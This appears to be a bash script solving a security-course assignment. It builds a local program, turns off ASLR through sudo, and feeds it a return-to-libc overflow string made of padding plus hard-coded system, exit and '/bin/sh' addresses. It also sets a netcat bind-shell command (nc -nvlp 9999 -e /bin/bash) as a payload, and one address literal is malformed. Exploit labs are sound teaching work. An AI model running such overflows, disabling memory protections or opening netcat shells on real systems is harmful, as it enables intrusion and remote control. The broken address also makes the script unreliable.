#!/bin/bash

# Move to the assignment directory
cd ./assignment

# Compile the project
make

# Turn OFF ASLR
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

# Set netcat payload as environment variable
export PAYLOAD="nc -nvlp 9999 -e /bin/bash"

# Address locations (little-endian)
SYSTEM_ADDR='\x70\x0d\xc5\xf7' 
EXIT_ADDR='\xf0\x55\xc4\xf7'
BINSH_ADDR='d5\x90\xdb\xf7'  

# Run the project
exploit_payload=$(python3 -c "print('A'*13 + 'B'*4 + '$SYSTEM_ADDR' + '$EXIT_ADDR' + '$BINSH_ADDR')")
./flawed "$exploit_payload"
